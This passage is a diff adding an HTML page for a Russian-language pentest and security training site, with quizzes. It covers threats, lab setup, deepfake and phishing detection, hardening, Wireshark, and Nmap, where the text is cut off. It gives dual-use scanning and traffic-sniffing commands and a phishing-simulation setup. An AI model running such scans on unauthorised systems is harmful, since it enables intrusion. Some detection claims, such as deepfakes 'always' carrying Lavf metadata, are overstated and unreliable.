@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDirectory — Полная энциклопедия ИБ и Пентеста</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="bar">
+    <div class="bar-left">
+        <button id="burger-btn" type="button" aria-label="Открыть меню">
+            <img src="images/menu.svg" alt="" width="18" height="18">
+        </button>
+        <span id="title">Главная — CyberDirectory</span>
+    </div>
+    <div class="bar-right">
+        <button id="home-btn" type="button" aria-label="На главную" title="На главную">
+            <img src="images/house.svg" alt="" width="18" height="18">
+        </button>
+        <input type="search" id="search-input" placeholder="Поиск темы..." aria-label="Поиск по разделам">
+        <div class="theme-switch" role="radiogroup" aria-label="Цветовая тема">
+            <input type="radio" name="theme" id="t-white" class="theme-radio" checked>
+            <label for="t-white" class="theme-dot dot-white" title="Terminal"></label>
+            <input type="radio" name="theme" id="t-matrix" class="theme-radio">
+            <label for="t-matrix" class="theme-dot dot-matrix" title="Matrix"></label>
+            <input type="radio" name="theme" id="t-amber" class="theme-radio">
+            <label for="t-amber" class="theme-dot dot-amber" title="Amber"></label>
+            <input type="radio" name="theme" id="t-cyan" class="theme-radio">
+            <label for="t-cyan" class="theme-dot dot-cyan" title="Cyan"></label>
+        </div>
+        <button id="theme-btn" type="button" aria-label="Сменить тему">
+            <img src="images/moon.svg" alt="" width="18" height="18">
+        </button>
+    </div>
+</header>
+
+<nav id="menu">
+    <button type="button" id="overview-btn">Обзор угроз</button>
+    <button type="button" id="arsenal-btn">⚠ Софт, полигоны и право</button>
+    <button type="button" id="deepfakes-btn">Дипфейки</button>
+    <button type="button" id="phishing-btn">Фишинг</button>
+    <button type="button" id="methods-btn">Методы защиты</button>
+    <button type="button" id="wireshark-btn">Анализ трафика (Wireshark)</button>
+    <button type="button" id="nmap-btn">Сканирование сети (Nmap)</button>
+    <button type="button" id="burp-btn">Перехват запросов (Burp Suite)</button>
+    <button type="button" id="sqli-btn">SQL-инъекции (SQLMap)</button>
+    <button type="button" id="xss-btn">Межсайтовый скриптинг (XSS)</button>
+    <button type="button" id="osint-btn">Сбор данных (OSINT)</button>
+    <button type="button" id="passwords-btn">Аудит паролей (Hashcat)</button>
+    <button type="button" id="wifi-btn">Аудит Wi-Fi (Aircrack-ng)</button>
+    <button type="button" id="metasploit-btn">Эксплойты (Metasploit)</button>
+    <button type="button" id="malware-btn">Анализ файлов и песочницы</button>
+    <button type="button" id="mobile-btn">Мобильный пентест (Android)</button>
+    <button type="button" id="opsec-btn">Анонимность и OPSEC</button>
+    <button type="button" id="mitm-btn">Атаки в локальной сети (MITM)</button>
+    <button type="button" id="privesc-btn">Повышение привилегий (Linux)</button>
+    <button type="button" id="stego-btn">Стеганография и форензика</button>
+    <button type="button" id="fuzzing-btn">Веб-фаззинг (Gobuster & ffuf)</button>
+    <button type="button" id="ad-btn">Аудит Active Directory</button>
+    <button type="button" id="docker-btn">Безопасность Docker</button>
+    <button type="button" id="api-btn">Пентест API и JWT</button>
+</nav>
+
+<main>
+
+    <section id="home">
+        <article class="card">
+            <h2>Добро пожаловать в CyberDirectory — Практический справочник по ИБ и Пентесту</h2>
+            <p>Ты находишься на интерактивной образовательной платформе, посвященной информационной безопасности, этичному хакингу (Red Team) и защите цифровых систем (Blue Team). Здесь нет сухой и скучной воды — только реальное устройство современных атак, рабочие консольные команды, профессиональные утилиты и проверочные тесты после каждой главы.</p>
+            <p>Понимание того, как мыслят и действуют злоумышленники — единственный способ выстроить по-настоящему надежную защиту для своих проектов, серверов и близких людей.</p>
+
+            <div class="icon-row">
+                <div class="icon-tile">
+                    <img src="images/shield.svg" alt="" width="34" height="34">
+                    <span>Защита</span>
+                </div>
+                <div class="icon-tile">
+                    <img src="images/terminal.svg" alt="" width="34" height="34">
+                    <span>Терминал</span>
+                </div>
+                <div class="icon-tile">
+                    <img src="images/lock.svg" alt="" width="34" height="34">
+                    <span>Пароли</span>
+                </div>
+                <div class="icon-tile">
+                    <img src="images/bug.svg" alt="" width="34" height="34">
+                    <span>Уязвимости</span>
+                </div>
+            </div>
+
+            <div class="ascii-diagram">[Новичок] ──► [Сети и Linux] ──► [Веб-пентест и OSINT] ──► [Реверс и Форензика] ──► [Специалист по ИБ]</div>
+
+            <h3>Чему ты научишься и что сможешь делать после прохождения:</h3>
+            <div class="skills-grid">
+                <div class="skill-box">
+                    <img src="images/router.svg" alt="" width="18" height="18">
+                    <h4>Аудит сетей и трафика</h4>
+                    <p>Сканировать открытые порты через Nmap и RustScan, читать дампы пакетов в Wireshark и выявлять MITM-атаки в локальной сети.</p>
+                </div>
+                <div class="skill-box">
+                    <img src="images/networks.svg" alt="" width="18" height="18">
+                    <h4>Тестирование веб-сайтов и API</h4>
+                    <p>Перехватывать HTTP-запросы в Burp Suite, находить скрытые директории через ffuf, проверять сайты на SQL-инъекции, XSS и уязвимости JWT-токенов.</p>
+                </div>
+                <div class="skill-box">
+                    <img src="images/osint.svg" alt="" width="18" height="18">
+                    <h4>OSINT и цифровая разведка</h4>
+                    <p>Автоматизировать поиск цифрового следа через SpiderFoot и theHarvester, искать утечки секретов в Git и распознавать дипфейки и фишинг.</p>
+                </div>
+                <div class="skill-box">
+                    <img src="images/android.svg" alt="" width="18" height="18">
+                    <h4>Безопасность Linux, AD и Android</h4>
+                    <p>Декомпилировать APK-приложения в JADX, находить векторы повышения привилегий через LinPEAS, проверять контейнеры Docker и домены Active Directory.</p>
+                </div>
+            </div>
+
+            <details class="css-accordion">
+                <summary>Как эффективно проходить обучение на платформе? (Нажми, чтобы раскрыть)</summary>
+                <div>
+                    <p>1. Разверни безопасную виртуальную машину (Kali Linux или Parrot OS) по инструкции из второго раздела.</p>
+                    <p>2. Изучай теорию и пробуй запускать приведенные команды утилит на легальных учебных стендах.</p>
+                    <p>3. В конце каждого из 24 модулей проходи проверочный тест, чтобы закрепить знания на практике.</p>
+                    <p>Бонус — проверь работу секретного CSS-интерактива (наведи курсор или нажми): <span class="spoiler">FLAG{WELCOME_TO_CYBERDIRECTORY_2026}</span></p>
+                </div>
+            </details>
+
+            <button type="button" id="start-course-btn" class="cta-btn">Начать обучение с первой темы ➔</button>
+        </article>
+    </section>
+
+    <section id="overview" class="hide">
+        <article class="card">
+            <h2>Полный обзор угроз в эпоху искусственного интеллекта</h2>
+            <div class="warning-box">
+                <b>ДИСКЛЕЙМЕР И ЭТИКА:</b> Все материалы, команды и утилиты на данном ресурсе представлены исключительно в образовательных целях, для подготовки к соревнованиям CTF (Capture The Flag) и защиты собственной инфраструктуры.
+            </div>
+            <p>Генеративный искусственный интеллект (LLM, диффузионные модели и автономные ИИ-агенты) совершил качественный переворот в кибербезопасности: написание эксплойтов, полиморфная обфускация кода и создание убедительных легенд для социальной инженерии автоматизируются за секунды.</p>
+            
+            <div class="ascii-diagram">[Разведка OSINT/ИИ] ──► [Полиморфный билд] ──► [AitM / Deepfake Доставка] ──► [Эксплуатация] ──► [Закрепление в системе]</div>
+
+            <p><b>Анатомия современной кибератаки (Cyber Kill Chain):</b></p>
+            <ul>
+                <li><b>1. Автоматизированная разведка (Reconnaissance):</b> Боты парсят соцсети, GitHub-репозитории и утечки баз данных за минуты.</li>
+                <li><b>2. Полиморфная вооруженность (Weaponization):</b> Трояны меняют имена переменных и шифруют строки при каждой сборке, обходя сигнатурные антивирусы.</li>
+                <li><b>3. Атаки на сами ИИ-модели (Prompt Injection):</b> Скрытые инструкции на веб-страницах заставляют корпоративных ИИ-ассистентов выполнять вредоносные команды.</li>
+            </ul>
+
+            <div class="dl-box">
+                <h4>Инструменты первичного мониторинга и поиска угроз (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Sysinternals Suite (Process Explorer & Autoruns)</b> — набор официальных утилит от Microsoft для глубокого анализа процессов и автозагрузки Windows.
+                        <br>— <i>Как пользоваться:</i> Скачайте архив с <code>learn.microsoft.com/sysinternals</code> и запустите <code>procexp64.exe</code> от имени администратора.
+                        <br>— Нажмите <code>Options -> Verify Image Signatures</code> и <code>Check VirusTotal.com</code> — программа сама проверит цифровую подпись каждого запущенного процесса и покажет рейтинг его хеша на VirusTotal (например, <code>0/72</code>).
+                        <br>— В утилите <code>Autoruns64.exe</code> перейдите на вкладку <code>Logon</code> и <code>Scheduled Tasks</code>, включите фильтр <code>Hide Microsoft Entries</code>, чтобы мгновенно увидеть все сторонние скрипты в автозагрузке.</li>
+                    <li><b>2. YARA</b> — «швейцарский нож» исследователей ИБ для поиска вредоносных файлов по текстовым и бинарным паттернам (сигнатурам).
+                        <br>— <i>Установка:</i> <code>sudo apt install yara</code> (Linux) или скачивание бинарника с GitHub <code>VirusTotal/yara</code>.
+                        <br>— <i>Как пользоваться:</i> Создайте файл правила <code>rule.yar</code> со строками, характерными для трояна, и запустите рекурсивное сканирование папки:
+                        <br><code>yara -r -s rule.yar /home/user/Downloads/</code> (флаг <code>-r</code> проверяет все вложенные папки, а <code>-s</code> выводит точную найденную строку внутри подозрительного файла).</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Общие угрозы</h3>
+            <form id="form-overview">
+                <p><b>1. Что изменилось в киберпреступности с развитием генеративного ИИ?</b></p>
+                <label><input type="radio" name="q1" value="0"> Атаки стали доступны исключительно военным корпорациям.</label>
+                <label><input type="radio" name="q1" value="1"> Массовое создание персонализированных ловушек полностью автоматизировалось.</label>
+                <label><input type="radio" name="q1" value="2"> Хакеры полностью отказались от использования интернета.</label>
+
+                <p><b>2. Почему полиморфное ПО на базе ИИ представляет особую сложность для защиты?</b></p>
+                <label><input type="radio" name="q2" value="1"> Код постоянно видоизменяется, обходя классические сигнатурные антивирусы.</label>
+                <label><input type="radio" name="q2" value="0"> Оно способно физически сжигать процессоры устройств.</label>
+                <label><input type="radio" name="q2" value="2"> Оно передается исключительно через бумажные носители.</label>
+
+                <p><b>3. За счет чего целевой фишинг стал масштабнее?</b></p>
+                <label><input type="radio" name="q3" value="0"> Увеличения числа спам-серверов в 100 раз.</label>
+                <label><input type="radio" name="q3" value="1"> Автоматического сбора цифрового следа жертв через нейросети.</label>
+                <label><input type="radio" name="q3" value="2"> Принудительного отключения спам-фильтров у всех провайдеров.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="arsenal" class="hide">
+        <article class="card">
+            <h2>Где скачивать софт, как строить лабораторию и меры безопасности</h2>
+            <div class="warning-box">
+                <b>ПРАВОВОЕ ПРЕДУПРЕЖДЕНИЕ (УК РК Статья 205 / УК РФ Статья 272):</b> Неправомерный доступ к компьютерной информации, сканирование портов или отправка эксплойтов на чужие ресурсы без разрешения влечет уголовную ответственность. Тренироваться можно <b>только</b> в собственной виртуальной лаборатории или на легальных полигонах.
+            </div>
+
+            <p><b>Золотые правила безопасности исследователя (Lab OPSEC):</b></p>
+            <ul>
+                <li><b>Полная изоляция на виртуальной машине:</b> Никогда не запускайте эксплойты и сомнительные утилиты на основной ОС. Разверните <b>Kali Linux</b> или <b>Parrot OS</b> внутри гипервизора.</li>
+                <li><b>Сетевой режим Host-Only / Nat Network:</b> При тренировке на локальных уязвимых машинах изолируйте их от внешней сети.</li>
+                <li><b>Снимки состояния (Snapshots):</b> Делайте снапшот перед любым тестом для отката за 3 секунды.</li>
+            </ul>
+
+            <div class="dl-box">
+                <h4>Инструменты виртуализации и развертывания полигонов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Oracle VirtualBox</b> — бесплатный гипервизор для запуска изолированных виртуальных машин (Kali Linux, Windows, Metasploitable).
+                        <br>— <i>Как пользоваться:</i> Скачайте установщик с <code>virtualbox.org</code> и готовый образ Kali Linux (формат <code>.vbox</code>) с <code>kali.org/get-kali</code>.
+                        <br>— Откройте VirtualBox -> нажмите <code>Machine -> Add</code> и выберите скачанный файл.
+                        <br>— В настройках сети (<code>Settings -> Network</code>) выберите <code>NAT Network</code> для безопасной связки атакующей и учебной машин. Управление из терминала: <code>VBoxManage list vms</code> и создание снимка: <code>VBoxManage snapshot "Kali" take "Clean_State"</code>.</li>
+                    <li><b>2. OpenVPN</b> — клиент для безопасного подключения к закрытым учебным сетям полигонов TryHackMe и HackTheBox.
+                        <br>— <i>Установка:</i> <code>sudo apt install openvpn</code>.
+                        <br>— <i>Как пользоваться:</i> Скачайте личный конфигурационный файл <code>.ovpn</code> из профиля на сайте TryHackMe или HackTheBox и запустите туннель в терминале:
+                        <br><code>sudo openvpn --config your_profile.ovpn</code>
+                        <br>— Убедитесь, что появился виртуальный сетевой интерфейс <code>tun0</code> с вашим лабораторным IP-адресом: <code>ip a show tun0</code>.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Безопасность исследователя и право</h3>
+            <form id="form-arsenal">
+                <p><b>1. Почему категорически нельзя скачивать «крякнутые» версии утилит для пентеста со сторонних форумов и Telegram-каналов?</b></p>
+                <label><input type="radio" name="arsenalQ1" value="1"> В такие сборки злоумышленники чаще всего вшивают стилеры паролей и трояны удаленного доступа (RAT).</label>
+                <label><input type="radio" name="arsenalQ1" value="0"> Они занимают в 100 раз больше места на жестком диске.</label>
+                <label><input type="radio" name="arsenalQ1" value="2"> Они работают только при подключении второго монитора.</label>
+
+                <p><b>2. На каких ресурсах законно практиковаться в поиске уязвимостей и запуске эксплойтов?</b></p>
+                <label><input type="radio" name="arsenalQ2" value="0"> На любых городских сайтах, если делать это ночью.</label>
+                <label><input type="radio" name="arsenalQ2" value="1"> Только на собственных локальных виртуальных машинах, официальных CTF-платформах (TryHackMe, HTB) или в рамках правил Bug Bounty.</label>
+                <label><input type="radio" name="arsenalQ2" value="2"> На соседских Wi-Fi роутерах для проверки скорости.</label>
+
+                <p><b>3. Откуда рекомендуется устанавливать актуальную версию терминала Termux на Android?</b></p>
+                <label><input type="radio" name="arsenalQ3" value="1"> Из официального репозитория F-Droid или GitHub проекта.</label>
+                <label><input type="radio" name="arsenalQ3" value="0"> По рекламной ссылке из спам-рассылки.</label>
+                <label><input type="radio" name="arsenalQ3" value="2"> Через неизвестные APK-обменники без проверки подписи.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="deepfakes" class="hide">
+        <article class="card">
+            <h2>Голосовые и видео дипфейки (Deepfakes)</h2>
+            <p>Технологии клонирования голоса (Zero-Shot Voice Cloning) и замены лиц в реальном времени (Real-Time Face Swap) активно применяются в телефонном мошенничестве (Vishing) и атаках на компании. Нейросетям типа RVC или XTTS достаточно 3–5 секунд записи голоса, чтобы синтезировать речь с тембром жертвы.</p>
+
+            <p><b>Живые провокационные тесты во время видеозвонка:</b></p>
+            <ul>
+                <li><b>Тест перекрытия (Occlusion Test):</b> Попросите собеседника провести ладонью с растопыренными пальцами перед лицом — нейросеть даст артефакты на границах пальцев.</li>
+                <li><b>Тест профиля (90 градусов):</b> При резком повороте головы строго в профиль маска дипфейка теряет привязку к ключевым точкам лица.</li>
+            </ul>
+
+            <div class="dl-box">
+                <h4>Утилиты для технической экспертизы медиафайлов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Audacity</b> — профессиональный аудиоредактор для выявления синтезированного голоса по спектрограмме.
+                        <br>— <i>Установка:</i> <code>sudo apt install audacity</code> или с сайта <code>audacityteam.org</code>.
+                        <br>— <i>Как пользоваться:</i> Перетащите подозрительное голосовое сообщение (<code>.ogg</code>, <code>.mp3</code>, <code>.wav</code>) в окно программы. Нажмите на название дорожки слева и переключите вид с <code>Waveform</code> на <b>Spectrogram (Спектрограмма)</b>.
+                        <br>— Если выше отметки <code>8 kHz</code> или <code>11 kHz</code> видна идеально ровная черная горизонтальная полоса («отрезанные» высокие частоты), а в паузах между словами нет естественного вдоха — аудио сгенерировано TTS-нейросетью.</li>
+                    <li><b>2. FFprobe (из пакета FFmpeg) & ExifTool</b> — консольные анализаторы потоков, кодеков и скрытых метаданных видео.
+                        <br>— <i>Установка:</i> <code>sudo apt install ffmpeg libimage-exiftool-perl</code>.
+                        <br>— <i>Как пользоваться:</i> Выполните <code>exiftool video.mp4</code> и <code>ffprobe -v quiet -print_format json -show_format -show_streams video.mp4</code>.
+                        <br>— Настоящее видео со смартфона содержит теги камеры (<code>Make</code>, <code>Model</code>, <code>Android/iOS version</code>). Дипфейк-видео после рендера в DeepFaceLab или Wav2Lip всегда имеет в поле <code>Writing application</code> библиотеку <code>Lavf</code> (FFmpeg) и неестественное расхождение битрейта аудио и видеодорожки.</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Дипфейки</h3>
+            <form id="form-deepfakes">
+                <p><b>1. Сколько чистого аудио достаточно современному ИИ для клонирования голоса?</b></p>
+                <label><input type="radio" name="deepfakesQ1" value="0"> Минимум 20 часов профессиональной студийной речи.</label>
+                <label><input type="radio" name="deepfakesQ1" value="1"> Буквально 3–5 секунд из открытого видео или голосового сообщения.</label>
+                <label><input type="radio" name="deepfakesQ1" value="2"> Голос невозможно синтезировать без согласия владельца.</label>
+
+                <p><b>2. Какой психологический паттерн сопровождает звонки с дипфейками?</b></p>
+                <label><input type="radio" name="deepfakesQ2" value="0"> Предложение перезвонить в любое удобное время позже.</label>
+                <label><input type="radio" name="deepfakesQ2" value="1"> Навязанная спешка, требование секретности и запрет класть трубку.</label>
+                <label><input type="radio" name="deepfakesQ2" value="2"> Длительное обсуждение отвлеченных бытовых тем.</label>
+
+                <p><b>3. Какой визуальный артефакт чаще всего выдает подмену лица на видео?</b></p>
+                <label><input type="radio" name="deepfakesQ3" value="1"> Размытие контуров и артефакты при резком повороте головы или перекрытии рукой.</label>
+                <label><input type="radio" name="deepfakesQ3" value="0"> Полное исчезновение картинки каждые две минуты.</label>
+                <label><input type="radio" name="deepfakesQ3" value="2"> Черно-белое изображение вместо цветного.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="phishing" class="hide">
+        <article class="card">
+            <h2>Усовершенствованный фишинг и AitM-атаки</h2>
+            <p>Современный фишинг использует обратные прокси-серверы в реальном времени (<b>AitM — Adversary-in-the-Middle</b>), которые пропускают через себя ввод пароля и 2FA-кода жертвы, перехватывая готовую сессионную куку (<code>Session Cookie</code>), а также технику <b>Browser-in-the-Browser (BitB)</b> — отрисовку фальшивого окна авторизации прямо внутри страницы на HTML/CSS.</p>
+
+            <div class="ascii-diagram">[Браузер жертвы] ◄──(Ввод логина + 2FA)──► [Прокси (Перехват Cookie)] ◄────► [Настоящий сервер]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты анализа ссылок и симуляции фишинга (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Gophish</b> — профессиональный Open-Source фреймворк для проведения учебных фишинговых рассылок и проверки осведомленности сотрудников (Security Awareness).
+                        <br>— <i>Как пользоваться:</i> Скачайте релиз с <code>getgophish.com</code>, запустите бинарный файл <code>./gophish</code> и откройте панель администратора по адресу <code>https://127.0.0.1:3333</code>.
+                        <br>— В разделе <code>Sending Profiles</code> настройте тестовый SMTP-сервер, в <code>Landing Pages</code> импортируйте учебную страницу, а в <code>Campaigns</code> запустите тест и отслеживайте статистику переходов.</li>
+                    <li><b>2. cURL + Whois + Dig</b> — связка консольных утилит для безопасного расследования подозрительной ссылки без открытия браузера.
+                        <br>— <i>Как пользоваться:</i> Чтобы раскрыть цепочку скрытых редиректов сокращенной ссылки и увидеть финальный домен, выполните:
+                        <br><code>curl -ILs -A "Mozilla/5.0" "https://suspicious-link.com" | grep -iE "HTTP/|Location:|Server:"</code>
+                        <br>— Проверьте дату регистрации домена (фишинговые домены живут несколько дней):
+                        <br><code>whois suspicious-domain.com | grep -iE "Creation Date|Registrar"</code>
+                        <br>— Проверьте наличие защитных почтовых записей SPF и DMARC у домена отправителя письма:
+                        <br><code>dig TXT +short _dmarc.domain.com</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Фишинг</h3>
+            <form id="form-phishing">
+                <p><b>1. Почему современные фишинговые тексты трудно выявить при быстром чтении?</b></p>
+                <label><input type="radio" name="phishingQ1" value="0"> Они пишутся исключительно программным двоичным кодом.</label>
+                <label><input type="radio" name="phishingQ1" value="1"> Языковые модели пишут грамотно и копируют деловой стиль нужной организации.</label>
+                <label><input type="radio" name="phishingQ1" value="2"> В них запрещено использовать больше трех слов.</label>
+
+                <p><b>2. Что позволяет злоумышленникам обойти SMS-коды при AitM-атаке?</b></p>
+                <label><input type="radio" name="phishingQ2" value="1"> Перехват действующей сессионной cookie в процессе проксирования входа.</label>
+                <label><input type="radio" name="phishingQ2" value="0"> Дистанционное удаление SIM-карты из телефона жертвы.</label>
+                <label><input type="radio" name="phishingQ2" value="2"> Запрос бумажной копии паспорта через почту.</label>
+
+                <p><b>3. Какое действие является самым надежным при получении тревожного письма от банка?</b></p>
+                <label><input type="radio" name="phishingQ3" value="0"> Немедленно ввести данные карты по ссылке в письме.</label>
+                <label><input type="radio" name="phishingQ3" value="1"> Закрыть письмо и самостоятельно открыть банковское приложение.</label>
+                <label><input type="radio" name="phishingQ3" value="2"> Ответить на письмо и выслать скриншот паспорта.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="methods" class="hide">
+        <article class="card">
+            <h2>Архитектура защиты, Hardening и криптогигиена</h2>
+            <p>Защита строится по модели <b>Defense in Depth (Эшелонированная оборона)</b> и <b>Zero Trust (Нулевое доверие)</b>: аппаратные ключи аутентификации FIDO2/Passkeys, полное шифрование дисков, изолированные менеджеры паролей и строгая фильтрация входящих сетевых соединений.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты криптозащиты и укрепления ОС (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. VeraCrypt</b> — стандарт криптографического шифрования дисков, флешек и создания скрытых контейнеров (алгоритмы AES-256, Serpent, Twofish).
+                        <br>— <i>Установка:</i> Скачайте с официального сайта <code>veracrypt.fr</code> или <code>sudo apt install veracrypt</code>.
+                        <br>— <i>Как пользоваться:</i> Нажмите <code>Create Volume -> Create an encrypted file container</code>. Выберите алгоритм <code>AES</code>, задайте размер файла (например, 2 ГБ) и сложный мастер-пароль, поводите мышкой в окне для генерации случайной энтропии ключей и нажмите <code>Format</code>. Чтобы подключить контейнер как виртуальный диск, выберите файл, слот (например, диск <code>Z:</code>) и нажмите <code>Mount</code>.</li>
+                    <li><b>2. UFW (Uncomplicated Firewall) & Fail2Ban</b> — связка межсетевого экрана и системы автоматической блокировки перебора паролей на Linux-сервере.
+                        <br>— <i>Установка:</i> <code>sudo apt install ufw fail2ban</code>.
+                        <br>— <i>Как пользоваться UFW:</i> Заблокируйте все входящие подключения по умолчанию и разрешите только нужные порты:
+                        <br><code>sudo ufw default deny incoming && sudo ufw default allow outgoing</code>
+                        <br><code>sudo ufw allow 22/tcp && sudo ufw enable && sudo ufw status verbose</code>
+                        <br>— <i>Как пользоваться Fail2Ban:</i> Скопируйте конфиг <code>sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local</code>, включите секцию <code>[sshd]</code> с параметрами <code>maxretry = 3</code> и <code>bantime = 1h</code>, запустите <code>sudo systemctl restart fail2ban</code>. Проверить забаненные IP атакующих: <code>sudo fail2ban-client status sshd</code>.</li>
+                    <li><b>3. KeePassXC</b> — полностью локальный Open-Source менеджер паролей с базой данных <code>.kdbx</code>, зашифрованной алгоритмом Argon2id.
+                        <br>— <i>Гайд:</i> Установите с <code>keepassxc.org</code>, создайте базу с мастер-паролем и ключевым файлом (Key File) на отдельной флешке. Используйте встроенный генератор паролей (длина от 20 символов).</li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Методы защиты</h3>
+            <form id="form-methods">
+                <p><b>1. Почему протокол Passkeys (FIDO2) надежнее обычного пароля с SMS?</b></p>
+                <label><input type="radio" name="methodsQ1" value="1"> Ключ криптографически привязан к домену и его невозможно украсть через фишинговый сайт.</label>
+                <label><input type="radio" name="methodsQ1" value="0"> Он работает только при выключенном питании компьютера.</label>
+                <label><input type="radio" name="methodsQ1" value="2"> Он не требует использования электричества.</label>
+
+                <p><b>2. В чем суть семейного протокола с кодовым словом?</b></p>
+                <label><input type="radio" name="methodsQ2" value="0"> Это запасной пароль от домашнего Wi-Fi роутера.</label>
+                <label><input type="radio" name="methodsQ2" value="1"> Проверка подлинности человека при подозрительном звонке от его имени.</label>
+                <label><input type="radio" name="methodsQ2" value="2"> Секретный промокод для скидки в интернет-магазинах.</label>
+
+                <p><b>3. Почему специалисты не рекомендуют использовать SMS для двухфакторной защиты?</b></p>
+                <label><input type="radio" name="methodsQ3" value="1"> SMS подвержены перехвату, социальной инженерии у операторов и фишингу через AitM.</label>
+                <label><input type="radio" name="methodsQ3" value="0"> SMS замедляют интернет-соединение на устройстве.</label>
+                <label><input type="radio" name="methodsQ3" value="2"> Отправка SMS разряжает аккумулятор за 10 секунд.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="wireshark" class="hide">
+        <article class="card">
+            <h2>Глубокий анализ сетевого трафика (Wireshark и TShark)</h2>
+            <p>Перевод сетевой карты в неразборчивый режим (Promiscuous Mode) позволяет перехватывать и разбирать каждый сетевой кадр по уровням модели OSI — от MAC-адресов Ethernet до прикладных данных HTTP, DNS и TLS.</p>
+
+            <div class="ascii-diagram">[Frame (Физика)] ──► [Ethernet (MAC)] ──► [IPv4 (IP-адреса)] ──► [TCP/UDP (Порты)] ──► [HTTP/DNS/TLS (Данные)]</div>
+
+            <div class="dl-box">
+                <h4>Инструменты перехвата и анализа пакетов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Wireshark (Графический анализатор)</b> — главный инструмент для форензики дампов трафика (файлы <code>.pcap</code> / <code>.pcapng</code>).
+                        <br>— <i>Как пользоваться:</i> Запустите Wireshark, выберите активный интерфейс (например, <code>eth0</code> или <code>wlan0</code>) и используйте строку <b>Display Filter</b>:
+                        <br>• Найти переданные в открытом виде формы и пароли: <code>http.request.method == "POST" || ftp.request.command == "PASS"</code>
+                        <br>• Выявить SYN-сканирование портов: <code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code>
+                        <br>• Увидеть домены в зашифрованном HTTPS-трафике (по заголовку SNI): <code>tls.handshake.extensions_server_name</code>
+                        <br>• Собрать пакеты в читаемый диалог: <b>Правый клик по пакету -> Follow -> TCP Stream</b>. Выгрузить переданные файлы: <b>File -> Export Objects -> HTTP</b>.</li>
+                    <li><b>2. TShark & tcpdump (Консольные анализаторы)</b> — незаменимы при работе по SSH на серверах без графического интерфейса и для быстрого парсинга больших дампов.
+                        <br>— <i>Захват трафика в файл через tcpdump:</i> <code>sudo tcpdump -i eth0 -nn -s0 -w dump.pcap port 80 or port 53</code>
+                        <br>— <i>Извлечение всех User-Agent и URI из дампа через TShark одной командой:</i>
+                        <br><code>tshark -r dump.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri</code></li>
+                </ul>
+            </div>
+        </article>
+
+        <article class="card">
+            <h3>Проверочный тест: Wireshark</h3>
+            <form id="form-wireshark">
+                <p><b>1. Какой фильтр в строке поиска Wireshark покажет только отправку данных веб-форм по HTTP?</b></p>
+                <label><input type="radio" name="wiresharkQ1" value="1"> http.request.method == "POST"</label>
+                <label><input type="radio" name="wiresharkQ1" value="0"> show.all.passwords == true</label>
+                <label><input type="radio" name="wiresharkQ1" value="2"> delete.tcp.packets</label>
+
+                <p><b>2. Что нужно нажать, чтобы собрать разрозненные пакеты одного соединения в единый читаемый текст?</b></p>
+                <label><input type="radio" name="wiresharkQ2" value="0"> Файл -> Удалить системный кэш.</label>
+                <label><input type="radio" name="wiresharkQ2" value="1"> Правый клик по пакету -> Follow -> TCP Stream (или HTTP Stream).</label>
+                <label><input type="radio" name="wiresharkQ2" value="2"> Дважды нажать кнопку питания на корпусе.</label>
+
+                <p><b>3. В каком из трех окон Wireshark можно раскрыть заголовки сетевого уровня и прочитать поля протокола?</b></p>
+                <label><input type="radio" name="wiresharkQ3" value="1"> В среднем окне (Packet Details).</label>
+                <label><input type="radio" name="wiresharkQ3" value="0"> В заголовке окна браузера.</label>
+                <label><input type="radio" name="wiresharkQ3" value="2"> В корзине операционной системы.</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+    <section id="nmap" class="hide">
+        <article class="card">
+            <h2>Активная сетевая разведка и сканирование портов (Nmap)</h2>
+            <p>На каждом сервере доступно <b>65 535 портов</b> TCP и UDP. Сетевые сканеры отправляют пакеты и по флагам ответа (<code>SYN-ACK</code>, <code>RST</code>, <code>ICMP Unreachable</code>) определяют открытые порты, версии служб и операционную систему.</p>
+
+            <div class="dl-box">
+                <h4>Инструменты сканирования сети и портов (Полный гайд)</h4>
+                <ul>
+                    <li><b>1. Nmap (Network Mapper)</b> — классический сканер с мощным скриптовым движком NSE (Nmap Scripting Engine).
+                        <br>— <i>Пошаговый гайд по командам:</i>
+                        <br>• Обнаружение живых хостов в подсети без сканирования портов: <code>nmap -sn 192.168.1.0/24</code>
+                        <br>• Быстрый скрытый SYN-скан всех 65535 портов: <code>sudo nmap -sS -p- --min-rate 2000 10.10.10.5</code>
+                        <br>• Глубокое определение версий сервисов, ОС и базовых скриптов на найденных портах: <code>sudo nmap -sC -sV -O -p 22,80,443 10.10.10.5 -oN scan_report.txt</code>
+                        <br>• Автоматическая проверка служб на известные уязвимости CVE: <code>nmap -sV --script=vuln 10.10.10.5</code></li>
